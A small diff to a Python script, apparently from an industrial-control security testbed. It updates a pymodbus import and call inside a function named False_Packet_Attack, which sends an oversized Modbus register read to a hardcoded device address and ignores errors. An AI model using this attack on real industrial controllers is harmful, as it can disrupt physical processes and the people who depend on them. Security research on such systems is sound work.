@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-from pymodbus.client import ModbusTcpClient as ModbusClient
+from pymodbus.client.sync import ModbusTcpClient as ModbusClient
 
 from datetime import datetime
 
@@ -13,7 +13,7 @@ def False_Packet_Attack():
     client = ModbusClient('192.168.1.230')
     client.connect()
     try:
-        client.read_holding_registers(1, 2100)
+        client.read_holding_registers(1, 2100, unit = 0)
     except:
         pass
     
